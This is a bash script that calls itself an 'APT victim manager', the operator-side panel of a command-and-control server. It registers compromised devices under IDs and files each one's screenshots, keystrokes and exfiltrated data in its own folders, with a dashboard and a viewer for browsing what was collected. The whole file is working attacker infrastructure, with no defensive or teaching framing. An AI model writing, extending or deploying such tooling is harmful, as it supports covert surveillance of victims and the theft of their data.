#!/bin/bash
# ============================================
# APT VICTIM MANAGER v1.0
# Auto-Register | Unique ID | Database
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

VICTIM_DIR="$HOME/c2_server/victims"
LOG_DIR="$HOME/c2_server/logs"
CONFIG_DIR="$HOME/c2_server/config"
DB_FILE="$CONFIG_DIR/victims.db"

mkdir -p "$VICTIM_DIR" "$LOG_DIR" "$CONFIG_DIR"

# Initialize counter
[ ! -f "$CONFIG_DIR/victim_counter" ] && echo 0 > "$CONFIG_DIR/victim_counter"

# === AUTO-REGISTER NEW VICTIM ===
register_victim() {
    local ip="$1"
    local hostname="$2"
    local device="$3"
    
    # Generate unique ID
    local counter=$(cat "$CONFIG_DIR/victim_counter")
    counter=$((counter + 1))
    echo $counter > "$CONFIG_DIR/victim_counter"
    
    local victim_id=$(printf "VICTIM-%03d" $counter)
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Create victim folder structure
    mkdir -p "$VICTIM_DIR/$victim_id"/{data,screenshots,keystrokes,exfiltrated,logs}
    
    # Save victim info
    cat > "$VICTIM_DIR/$victim_id/info.json" << INFO
{
  "id": "$victim_id",
  "ip": "$ip",
  "hostname": "$hostname",
  "device": "$device",
  "first_seen": "$timestamp",
  "last_seen": "$timestamp",
  "status": "online",
  "risk_score": "green",
  "sessions": 1
}
INFO
    
    # Log to database
    echo "[$timestamp] REGISTER | $victim_id | $ip | $hostname | $device" >> "$LOG_DIR/victim_registry.log"
    
    echo -e "${GREEN}[+] New Victim Registered: $victim_id${NC}"
    echo -e "    IP: $ip | Device: $device | Hostname: $hostname"
    
    return 0
}

# === UPDATE VICTIM STATUS ===
update_victim_status() {
    local victim_id="$1"
    local status="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    if [ -f "$VICTIM_DIR/$victim_id/info.json" ]; then
        # Update last_seen and status
        sed -i "s/\"last_seen\": \".*\"/\"last_seen\": \"$timestamp\"/" "$VICTIM_DIR/$victim_id/info.json"
        sed -i "s/\"status\": \".*\"/\"status\": \"$status\"/" "$VICTIM_DIR/$victim_id/info.json"
        
        # Increment session count
        local sessions=$(grep -o '"sessions": [0-9]*' "$VICTIM_DIR/$victim_id/info.json" | grep -o '[0-9]*')
        sessions=$((sessions + 1))
        sed -i "s/\"sessions\": [0-9]*/\"sessions\": $sessions/" "$VICTIM_DIR/$victim_id/info.json"
        
        echo "[$timestamp] UPDATE | $victim_id | Status: $status" >> "$LOG_DIR/victim_activity.log"
    fi
}

# === VICTIM DASHBOARD ===
victim_dashboard() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                   📊 VICTIM DASHBOARD                        ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    printf "%-15s %-18s %-12s %-20s %-10s\n" "ID" "IP" "Status" "Last Seen" "Risk"
    echo "────────────────────────────────────────────────────────────────────"
    
    for victim_folder in "$VICTIM_DIR"/VICTIM-*; do
        [ -d "$victim_folder" ] || continue
        
        local id=$(basename "$victim_folder")
        local ip=$(grep -o '"ip": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)
        local status=$(grep -o '"status": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)
        local last=$(grep -o '"last_seen": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)
        local risk=$(grep -o '"risk_score": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)
        
        # Color code status
        local status_color=""
        case $status in
            online) status_color="${GREEN}● ONLINE ${NC}" ;;
            offline) status_color="${RED}○ OFFLINE${NC}" ;;
            *) status_color="${YELLOW}~ UNKNOWN${NC}" ;;
        esac
        
        printf "%-15s %-18s %-12s %-20s %-10s\n" "$id" "${ip:-N/A}" "$status_color" "${last:-N/A}" "${risk:-green}"
    done
    
    echo ""
    echo -e "${CYAN}Total Victims: $(ls -d $VICTIM_DIR/VICTIM-* 2>/dev/null | wc -l)${NC}"
}

# === LIST ALL VICTIMS ===
list_victims() {
    echo -e "\n${YELLOW}[All Registered Victims]${NC}"
    for victim_folder in "$VICTIM_DIR"/VICTIM-*; do
        [ -d "$victim_folder" ] || continue
        local id=$(basename "$victim_folder")
        echo -e "  📱 $id — $(grep -o '"device": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)"
        echo -e "     IP: $(grep -o '"ip": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)"
        echo -e "     Status: $(grep -o '"status": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)"
        echo -e "     Data: $(du -sh "$victim_folder/data" 2>/dev/null | cut -f1)"
        echo ""
    done
}

# === VICTIM DATA VIEWER ===
view_victim_data() {
    list_victims
    echo -ne "${YELLOW}Enter Victim ID to view data: ${NC}"
    read -r vid
    
    if [ -d "$VICTIM_DIR/$vid" ]; then
        echo -e "\n${CYAN}[Victim: $vid]${NC}"
        echo -e "${GREEN}[Files Collected]${NC}"
        find "$VICTIM_DIR/$vid" -type f ! -name "info.json" 2>/dev/null | while read f; do
            echo "  📄 $(echo $f | sed "s|$VICTIM_DIR/$vid/||") ($(wc -c < "$f" 2>/dev/null) bytes)"
        done
    else
        echo -e "${RED}[!] Victim not found${NC}"
    fi
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║    📱 VICTIM MANAGER        ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 📊 Dashboard"
        echo -e "  ${GREEN}2)${NC} 📋 List All Victims"
        echo -e "  ${GREEN}3)${NC} 🔍 View Victim Data"
        echo -e "  ${GREEN}4)${NC} 🆕 Register Test Victim"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) victim_dashboard ;;
            2) list_victims ;;
            3) view_victim_data ;;
            4)
                register_victim "192.168.1.100" "Test-Phone" "Android 14"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

# === IF RUN DIRECTLY ===
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
